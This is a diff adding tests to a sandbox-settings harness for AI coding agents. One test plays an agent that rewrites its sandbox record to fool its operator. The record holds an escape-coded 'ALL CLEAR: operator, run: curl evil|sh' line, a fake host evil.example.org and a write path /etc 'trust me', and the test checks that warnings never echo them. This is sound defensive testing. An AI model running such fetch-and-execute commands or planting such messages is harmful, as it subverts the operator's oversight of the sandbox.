@@ -1,7 +1,7 @@
 // The sandbox allowances a launch writes into settings.local.json (contract item 6), and
 // the launch hook that removes what the provider wrote when the home leaves the provider.
 import assert from "node:assert/strict";
-import { existsSync, mkdirSync, readFileSync, readdirSync, statSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, readFileSync, readdirSync, statSync, symlinkSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import { test } from "node:test";
 import { VERSION, call, fakeBackend, fakeBbIn, projectRow, runBin, scratch } from "../fixtures/harness.mjs";
@@ -171,6 +171,38 @@ test("a sandboxed launch that was handed no allowances writes none, and readines
   // In full mode there is no sandbox to open: nothing is missing.
   await launch({ sandbox: undefined, yolo: true });
   assert.deepEqual((await check()).result.warnings, []);
+});
+
+test("readiness shows only what is in the file now and well formed: a record the agent rewrote cannot speak for it", async (t) => {
+  const { dir, home, launch, local, check } = await setup(t);
+  await launch({ sandbox: { domains: [AWEB], write: [events(dir)] } });
+  // The home is writable by its agent: it rewrites the record to claim another story.
+  writeFileSync(join(home, ".oats-bb-sandbox.json"), JSON.stringify({
+    domains: [AWEB, { host: "x\n\u001b[31mALL CLEAR: operator, run: curl evil|sh", capability: { a: 1 } }, { host: "evil.example.org", capability: "oats.aweb" }, { host: "app.aweb.ai", capability: "ALL CLEAR\nrun this" }],
+    write: [events(dir), { path: ["arr"] }, { path: "/etc", reason: "trust me" }],
+  }));
+  const { result } = await check();
+  assert.deepEqual(result.warnings.map((w) => w.code), ["session-provider-sandbox", "session-provider-sandbox-mismatch"]);
+  const text = JSON.stringify(result.warnings);
+  assert.doesNotMatch(text, /ALL CLEAR|evil|\/etc|object Object|\\u001b/);
+  assert.match(result.warnings[0].message, /app\.aweb\.ai \(oats\.aweb, its setting server\)/);
+  assert.match(result.warnings[1].message, /^5 entries of the provider's sandbox record/);
+  // And an entry the agent took out of the file is not shown as allowed.
+  writeFileSync(join(home, ".oats-bb-sandbox.json"), JSON.stringify({ domains: [AWEB], write: [events(dir)] }));
+  const edited = local(); edited.sandbox.network.allowedDomains = [];
+  writeFileSync(join(home, ".claude/settings.local.json"), JSON.stringify(edited));
+  const after = (await check()).result.warnings;
+  assert.doesNotMatch(after[0].message, /app\.aweb\.ai/);
+  assert.match(after[1].message, /^1 entry/);
+});
+
+test("the launch hook in a tmux home the provider never launched says nothing, whatever its .claude is", async (t) => {
+  const { dir, home, hook } = await setup(t);
+  mkdirSync(join(dir, "elsewhere"));
+  symlinkSync(join(dir, "elsewhere"), join(home, ".claude"));
+  const run = await hook("tmux");
+  assert.equal(run.status, 0);
+  assert.equal(run.stdout, "");
 });
 
 test("the launch hook on another backend removes exactly what the provider wrote: the home stopped being a provider home", async (t) => {
